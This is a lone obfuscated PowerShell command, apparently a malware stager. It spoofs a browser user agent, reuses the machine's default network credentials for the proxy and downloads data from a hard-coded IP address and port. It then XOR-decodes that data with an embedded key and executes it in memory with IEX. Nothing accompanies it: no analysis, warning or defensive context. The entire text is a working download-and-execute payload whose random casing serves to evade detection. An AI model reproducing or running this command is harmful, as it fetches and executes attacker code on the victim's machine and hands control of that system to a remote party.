
[SYStEm.NET.SeRVICePOINTManAgEr]::EXPect100CONtInue = 0;$wc=NEw-ObJecT SYsteM.NEt.WEbClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEaDerS.AdD('User-Agent',$u);$Wc.PRoXy = [SYsTEM.NeT.WEbREQueST]::DefaULTWEbPRoXy;$wC.PRoxy.CREdentialS = [SYsTEm.NET.CREdEntIaLCAcHe]::DeFAUlTNeTWorkCrEDeNTIALS;$K='63a9f0ea7bb98050796b649e85481845';$i=0;[CHAR[]]$b=([cHAR[]]($wC.DoWNloadStrInG("http://138.121.170.12:3136/index.asp")))|%{$_-BXOr$k[$i++%$k.LEngtH]};IEX ($B-JoIn'')

